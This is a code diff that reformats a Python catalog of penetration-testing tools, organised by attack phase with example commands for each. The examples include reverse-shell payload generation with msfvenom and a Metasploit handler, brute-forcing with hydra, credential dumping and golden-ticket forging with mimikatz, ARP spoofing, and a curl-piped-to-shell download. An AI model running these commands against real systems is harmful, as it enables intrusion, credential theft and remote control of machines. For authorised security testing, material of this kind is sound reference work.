@@ -13,7 +13,6 @@ TOOL_CATALOG: list[dict] = [
     # ══════════════════════════════════════════════════════════
     # PHASE 1: RECONNAISSANCE (Passive & Active)
     # ══════════════════════════════════════════════════════════
-
     # ── Passive Recon / OSINT ────────────────────────────────
     {
         "name": "theHarvester",
@@ -35,7 +34,10 @@ TOOL_CATALOG: list[dict] = [
     {
         "name": "amass",
         "category": "osint",
-        "description": "Attack surface mapping — subdomain enumeration via passive and active sources",
+        "description": (
+            "Attack surface mapping — subdomain enumeration"
+            " via passive and active sources"
+        ),
         "auth": "none",
         "examples": [
             "amass enum -passive -d {target}",
@@ -101,12 +103,14 @@ TOOL_CATALOG: list[dict] = [
             "-l": "Listener address for web UI",
         },
     },
-
     # ── Active Recon / Network Scanning ──────────────────────
     {
         "name": "nmap",
         "category": "recon",
-        "description": "Network mapper — host discovery, port scanning, service/version detection, OS fingerprinting, NSE scripts",
+        "description": (
+            "Network mapper — host discovery, port scanning,"
+            " service/version detection, OS fingerprinting, NSE scripts"
+        ),
         "auth": "none",
         "examples": [
             "nmap -sV -sC -O -oA scan {target}",
@@ -167,7 +171,6 @@ TOOL_CATALOG: list[dict] = [
             "--ulimit": "File descriptor limit",
         },
     },
-
     # ── DNS Enumeration ──────────────────────────────────────
     {
         "name": "dnsrecon",
@@ -201,12 +204,14 @@ TOOL_CATALOG: list[dict] = [
             "--dns-servers": "Custom DNS servers",
         },
     },
-
     # ── SMB / NetBIOS Enumeration ────────────────────────────
     {
         "name": "enum4linux",
         "category": "recon",
-        "description": "Windows/Samba enumeration — users, shares, groups, policies (unauthenticated)",
+        "description": (
+            "Windows/Samba enumeration — users, shares,"
+            " groups, policies (unauthenticated)"
+        ),
         "auth": "none",
         "examples": [
             "enum4linux -a {target}",
@@ -294,7 +299,6 @@ TOOL_CATALOG: list[dict] = [
             "-c": "Command to execute",
         },
     },
-
     # ── SNMP ─────────────────────────────────────────────────
     {
         "name": "snmpwalk",
@@ -327,7 +331,6 @@ TOOL_CATALOG: list[dict] = [
             "-i": "Target list file",
         },
     },
-
     # ── Web Recon ────────────────────────────────────────────
     {
         "name": "whatweb",
@@ -364,11 +367,9 @@ TOOL_CATALOG: list[dict] = [
             "-follow-redirects": "Follow HTTP redirects",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 2: VULNERABILITY ANALYSIS
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "nikto",
         "category": "vuln-scan",
@@ -392,7 +393,10 @@ TOOL_CATALOG: list[dict] = [
     {
         "name": "nuclei",
         "category": "vuln-scan",
-        "description": "Template-based vulnerability scanner — fast, extensible, community templates",
+        "description": (
+            "Template-based vulnerability scanner"
+            " — fast, extensible, community templates"
+        ),
         "auth": "both",
         "examples": [
             "nuclei -u http://{target} -as",
@@ -452,7 +456,10 @@ TOOL_CATALOG: list[dict] = [
     {
         "name": "nessus",
         "category": "vuln-scan",
-        "description": "Comprehensive vulnerability scanner — credentialed and uncredentialed scans",
+        "description": (
+            "Comprehensive vulnerability scanner"
+            " — credentialed and uncredentialed scans"
+        ),
         "auth": "both",
         "examples": [
             "# Start Nessus service",
@@ -469,19 +476,24 @@ TOOL_CATALOG: list[dict] = [
         "auth": "both",
         "examples": [
             "gvm-start",
-            "gvm-cli socket --xml '<create_target><name>target</name><hosts>{target}</hosts></create_target>'",
+            (
+                "gvm-cli socket --xml '<create_target>"
+                "<name>target</name><hosts>{target}</hosts>"
+                "</create_target>'"
+            ),
         ],
         "flags": {},
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 3: WEB APPLICATION TESTING
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "burpsuite",
         "category": "web",
-        "description": "Web application security testing platform — proxy, scanner, intruder, repeater",
+        "description": (
+            "Web application security testing platform"
+            " — proxy, scanner, intruder, repeater"
+        ),
         "auth": "both",
         "examples": [
             "burpsuite &",
@@ -497,7 +509,11 @@ TOOL_CATALOG: list[dict] = [
         "auth": "both",
         "examples": [
             "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
-            "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,html,txt",
+            (
+                "gobuster dir -u http://{target}"
+                " -w /usr/share/seclists/Discovery/Web-Content/"
+                "raft-medium-directories.txt -x php,asp,aspx,jsp,html,txt"
+            ),
             "gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt",
             "gobuster vhost -u http://{target} -w /usr/share/wordlists/vhosts.txt",
             "gobuster dir -u http://{target} -w wordlist.txt -c 'session=COOKIE_VALUE'",
@@ -516,14 +532,28 @@ TOOL_CATALOG: list[dict] = [
     {
         "name": "ffuf",
         "category": "web",
-        "description": "Fast web fuzzer — directory discovery, parameter brute-forcing, virtual hosts",
+        "description": (
+            "Fast web fuzzer — directory discovery,"
+            " parameter brute-forcing, virtual hosts"
+        ),
         "auth": "both",
         "examples": [
             "ffuf -u http://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
             "ffuf -u http://{target}/FUZZ -w wordlist.txt -fc 404 -mc 200,301,302",
-            "ffuf -u 'http://{target}/api?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
-            "ffuf -u http://{target}/FUZZ -w wordlist.txt -b 'session=TOKEN' -H 'Authorization: Bearer TOKEN'",
-            "ffuf -u http://{target}/api/user/FUZZ -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -mc all -fc 400",
+            (
+                "ffuf -u 'http://{target}/api?FUZZ=test'"
+                " -w /usr/share/seclists/Discovery/"
+                "Web-Content/burp-parameter-names.txt"
+            ),
+            (
+                "ffuf -u http://{target}/FUZZ -w wordlist.txt"
+                " -b 'session=TOKEN' -H 'Authorization: Bearer TOKEN'"
+            ),
+            (
+                "ffuf -u http://{target}/api/user/FUZZ"
+                " -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt"
+                " -mc all -fc 400"
+            ),
         ],
         "flags": {
             "-u": "URL with FUZZ keyword",
@@ -549,7 +579,11 @@ TOOL_CATALOG: list[dict] = [
             "sqlmap -u 'http://{target}/page?id=1' --dump -D dbname -T users",
             "sqlmap -r request.txt --batch --level 5 --risk 3",
             "sqlmap -u 'http://{target}/page?id=1' --os-shell",
-            "sqlmap -u 'http://{target}/login' --data='user=admin&pass=test' --cookie='session=TOKEN' --batch",
+            (
+                "sqlmap -u 'http://{target}/login'"
+                " --data='user=admin&pass=test'"
+                " --cookie='session=TOKEN' --batch"
+            ),
         ],
         "flags": {
             "-u": "Target URL with parameter",
@@ -574,7 +608,11 @@ TOOL_CATALOG: list[dict] = [
         "examples": [
             "wpscan --url http://{target} -e vp,vt,u",
             "wpscan --url http://{target} -e vp --plugins-detection aggressive",
-            "wpscan --url http://{target} --passwords /usr/share/wordlists/rockyou.txt --usernames admin",
+            (
+                "wpscan --url http://{target}"
+                " --passwords /usr/share/wordlists/rockyou.txt"
+                " --usernames admin"
+            ),
             "wpscan --url http://{target} --api-token YOUR_TOKEN -e vp,vt,tt,cb,dbe",
         ],
         "flags": {
@@ -594,7 +632,11 @@ TOOL_CATALOG: list[dict] = [
         "examples": [
             "xsstrike -u 'http://{target}/search?q=test'",
             "xsstrike -u 'http://{target}/search?q=test' --crawl",
-            "xsstrike -u 'http://{target}/page' --data 'input=test' --headers 'Cookie: session=TOKEN'",
+            (
+                "xsstrike -u 'http://{target}/page'"
+                " --data 'input=test'"
+                " --headers 'Cookie: session=TOKEN'"
+            ),
         ],
         "flags": {
             "-u": "Target URL",
@@ -638,22 +680,36 @@ TOOL_CATALOG: list[dict] = [
             "--custom-payload": "Custom XSS payloads",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 4: EXPLOITATION
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "metasploit",
         "category": "exploitation",
-        "description": "Penetration testing framework — exploit development, delivery, post-exploitation",
+        "description": (
+            "Penetration testing framework"
+            " — exploit development, delivery, post-exploitation"
+        ),
         "auth": "both",
         "examples": [
-            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT 4444; run'",
+            (
+                "msfconsole -q -x 'use exploit/multi/handler;"
+                " set PAYLOAD windows/x64/meterpreter/reverse_tcp;"
+                " set LHOST {lhost}; set LPORT 4444; run'"
+            ),
             "msfconsole -q -x 'search type:exploit name:apache; exit'",
-            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; check'",
-            "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f elf -o shell.elf",
-            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f exe -o shell.exe",
+            (
+                "msfconsole -q -x 'use exploit/windows/smb/"
+                "ms17_010_eternalblue; set RHOSTS {target}; check'"
+            ),
+            (
+                "msfvenom -p linux/x64/shell_reverse_tcp"
+                " LHOST={lhost} LPORT=4444 -f elf -o shell.elf"
+            ),
+            (
+                "msfvenom -p windows/x64/meterpreter/reverse_tcp"
+                " LHOST={lhost} LPORT=4444 -f exe -o shell.exe"
+            ),
             "msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT=4444 -f raw -o shell.php",
         ],
         "flags": {
@@ -665,21 +721,26 @@ TOOL_CATALOG: list[dict] = [
             "check": "Check if target is vulnerable without exploiting",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 5: PASSWORD ATTACKS (Online & Offline)
     # ══════════════════════════════════════════════════════════
-
     # ── Online Brute Force ───────────────────────────────────
     {
         "name": "hydra",
         "category": "password",
-        "description": "Online password brute-forcing — SSH, FTP, HTTP, SMB, RDP, LDAP, and 50+ protocols",
+        "description": (
+            "Online password brute-forcing"
+            " — SSH, FTP, HTTP, SMB, RDP, LDAP, and 50+ protocols"
+        ),
         "auth": "none",
         "examples": [
             "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
             "hydra -L users.txt -P passwords.txt {target} ftp",
-            "hydra -l admin -P passwords.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
+            (
+                "hydra -l admin -P passwords.txt {target}"
+                " http-post-form"
+                " '/login:user=^USER^&pass=^PASS^:F=incorrect'"
+            ),
             "hydra -l admin -P passwords.txt {target} rdp",
             "hydra -L users.txt -P passwords.txt {target} smb",
             "hydra -l admin -P passwords.txt {target} mysql",
@@ -762,7 +823,6 @@ TOOL_CATALOG: list[dict] = [
             "--bloodhound": "Collect BloodHound data",
         },
     },
-
     # ── Offline Cracking ─────────────────────────────────────
     {
         "name": "john",
@@ -803,12 +863,14 @@ TOOL_CATALOG: list[dict] = [
             "-r": "Rules file",
         },
     },
-
     # ── Kerberos / AD Authentication ─────────────────────────
     {
         "name": "kerbrute",
         "category": "password",
-        "description": "Kerberos brute-force — user enumeration and password spraying via Kerberos pre-auth",
+        "description": (
+            "Kerberos brute-force — user enumeration"
+            " and password spraying via Kerberos pre-auth"
+        ),
         "auth": "none",
         "examples": [
             "kerbrute userenum -d domain.local --dc {target} users.txt",
@@ -823,15 +885,16 @@ TOOL_CATALOG: list[dict] = [
             "--dc": "Domain controller",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 6: ACTIVE DIRECTORY ATTACKS
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "bloodhound",
         "category": "ad-attack",
-        "description": "Active Directory attack path mapping — visualize privilege escalation paths",
+        "description": (
+            "Active Directory attack path mapping"
+            " — visualize privilege escalation paths"
+        ),
         "auth": "authenticated",
         "examples": [
             "bloodhound-python -u 'user' -p 'pass' -d domain.local -ns {target} -c all",
@@ -899,8 +962,16 @@ TOOL_CATALOG: list[dict] = [
         "examples": [
             "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
             "mimikatz.exe 'privilege::debug' 'lsadump::sam' 'exit'",
-            "mimikatz.exe 'privilege::debug' 'lsadump::dcsync /domain:domain.local /user:krbtgt' 'exit'",
-            "mimikatz.exe 'kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-... /krbtgt:HASH /ptt'",
+            (
+                "mimikatz.exe 'privilege::debug'"
+                " 'lsadump::dcsync /domain:domain.local"
+                " /user:krbtgt' 'exit'"
+            ),
+            (
+                "mimikatz.exe 'kerberos::golden /user:admin"
+                " /domain:domain.local /sid:S-1-5-..."
+                " /krbtgt:HASH /ptt'"
+            ),
             "mimikatz.exe 'sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH'",
         ],
         "flags": {
@@ -919,7 +990,11 @@ TOOL_CATALOG: list[dict] = [
         "auth": "authenticated",
         "examples": [
             "certipy find -u 'user@domain.local' -p 'pass' -dc-ip {target} -vulnerable",
-            "certipy req -u 'user@domain.local' -p 'pass' -ca 'CA-NAME' -template 'vuln-template' -upn 'admin@domain.local'",
+            (
+                "certipy req -u 'user@domain.local' -p 'pass'"
+                " -ca 'CA-NAME' -template 'vuln-template'"
+                " -upn 'admin@domain.local'"
+            ),
             "certipy auth -pfx admin.pfx -dc-ip {target}",
         ],
         "flags": {
@@ -936,9 +1011,25 @@ TOOL_CATALOG: list[dict] = [
         "auth": "both",
         "examples": [
             "ldapsearch -x -H ldap://{target} -b 'dc=domain,dc=local'",
-            "ldapsearch -x -H ldap://{target} -D 'user@domain.local' -w 'pass' -b 'dc=domain,dc=local' '(objectClass=user)'",
-            "ldapsearch -x -H ldap://{target} -D 'user@domain.local' -w 'pass' -b 'dc=domain,dc=local' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'",
-            "ldapsearch -x -H ldap://{target} -D 'user@domain.local' -w 'pass' -b 'dc=domain,dc=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName",
+            (
+                "ldapsearch -x -H ldap://{target}"
+                " -D 'user@domain.local' -w 'pass'"
+                " -b 'dc=domain,dc=local' '(objectClass=user)'"
+            ),
+            (
+                "ldapsearch -x -H ldap://{target}"
+                " -D 'user@domain.local' -w 'pass'"
+                " -b 'dc=domain,dc=local'"
+                " '(userAccountControl"
+                ":1.2.840.113556.1.4.803:=4194304)'"
+            ),
+            (
+                "ldapsearch -x -H ldap://{target}"
+                " -D 'user@domain.local' -w 'pass'"
+                " -b 'dc=domain,dc=local'"
+                " '(servicePrincipalName=*)'"
+                " sAMAccountName servicePrincipalName"
+            ),
         ],
         "flags": {
             "-x": "Simple authentication",
@@ -1027,18 +1118,20 @@ TOOL_CATALOG: list[dict] = [
             "-i": "Interface",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 7: POST-EXPLOITATION
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "linpeas",
         "category": "post-exploit",
         "description": "Linux privilege escalation enumeration script",
         "auth": "authenticated",
         "examples": [
-            "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+            (
+                "curl -L https://github.com/carlospolop/"
+                "PEASS-ng/releases/latest/download/linpeas.sh"
+                " | sh"
+            ),
             "./linpeas.sh -a 2>&1 | tee linpeas_output.txt",
         ],
         "flags": {
@@ -1121,15 +1214,16 @@ TOOL_CATALOG: list[dict] = [
             "--stealth": "Stealth mode (slower, less noise)",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # PHASE 8: LATERAL MOVEMENT & PIVOTING
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "netcat",
         "category": "networking",
-        "description": "Swiss army knife for TCP/UDP — port listening, file transfer, reverse shells",
+        "description": (
+            "Swiss army knife for TCP/UDP"
+            " — port listening, file transfer, reverse shells"
+        ),
         "auth": "none",
         "examples": [
             "nc -lvnp 4444",
@@ -1191,7 +1285,10 @@ TOOL_CATALOG: list[dict] = [
     {
         "name": "proxychains",
         "category": "networking",
-        "description": "Force TCP connections through SOCKS/HTTP proxies — pivot through compromised hosts",
+        "description": (
+            "Force TCP connections through SOCKS/HTTP proxies"
+            " — pivot through compromised hosts"
+        ),
         "auth": "none",
         "examples": [
             "proxychains nmap -sT -Pn -p 80,443,445 {target}",
@@ -1214,11 +1311,9 @@ TOOL_CATALOG: list[dict] = [
             "--dns": "Forward DNS requests",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # WIRELESS ATTACKS
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "aircrack-ng",
         "category": "wireless",
@@ -1248,11 +1343,9 @@ TOOL_CATALOG: list[dict] = [
             "--dict": "Wordlist for cracking",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # SNIFFING & MAN-IN-THE-MIDDLE
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "wireshark",
         "category": "sniffing",
@@ -1262,7 +1355,11 @@ TOOL_CATALOG: list[dict] = [
             "tshark -i eth0 -c 100",
             "tshark -i eth0 -f 'tcp port 80' -Y 'http.request'",
             "tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport",
-            "tshark -i eth0 -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e http.file_data",
+            (
+                "tshark -i eth0 -Y 'http.request.method == POST'"
+                " -T fields -e http.host"
+                " -e http.request.uri -e http.file_data"
+            ),
         ],
         "flags": {
             "-i": "Interface",
@@ -1281,7 +1378,10 @@ TOOL_CATALOG: list[dict] = [
         "examples": [
             "bettercap -iface eth0",
             "bettercap -iface eth0 -caplet http-ui",
-            "bettercap -eval 'net.probe on; net.sniff on; set arp.spoof.targets {target}; arp.spoof on'",
+            (
+                "bettercap -eval 'net.probe on; net.sniff on;"
+                " set arp.spoof.targets {target}; arp.spoof on'"
+            ),
         ],
         "flags": {
             "-iface": "Network interface",
@@ -1289,15 +1389,16 @@ TOOL_CATALOG: list[dict] = [
             "-eval": "Run commands",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # DIGITAL FORENSICS & ANALYSIS
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "volatility",
         "category": "forensics",
-        "description": "Memory forensics framework — analyze RAM dumps for malware, credentials, artifacts",
+        "description": (
+            "Memory forensics framework"
+            " — analyze RAM dumps for malware, credentials, artifacts"
+        ),
         "auth": "none",
         "examples": [
             "vol.py -f memory.dmp imageinfo",
@@ -1337,11 +1438,9 @@ TOOL_CATALOG: list[dict] = [
             "--signature": "Scan for file signatures",
         },
     },
-
     # ══════════════════════════════════════════════════════════
     # REPORTING & EVIDENCE
     # ══════════════════════════════════════════════════════════
-
     {
         "name": "cutycapt",
         "category": "reporting",
@@ -1408,7 +1507,10 @@ PENTEST_PHASES = {
         ("ad-attack", "AD enumeration — users, groups, SPNs, ACLs, attack paths"),
         ("post-exploit", "Privilege escalation — kernel exploits, misconfigs, cred harvesting"),
         ("ad-attack", "Credential attacks — Kerberoasting, AS-REP roasting, DCSync"),
-        ("networking", "Lateral movement — pivot to internal hosts, tunnel through compromised systems"),
+        (
+            "networking",
+            "Lateral movement — pivot to internal hosts, tunnel through compromised systems",
+        ),
         ("ad-attack", "Persistence — golden ticket, skeleton key, AD CS abuse"),
         ("forensics", "Evidence collection — memory dumps, disk artifacts"),
         ("reporting", "Documentation — screenshots, findings, remediation recommendations"),
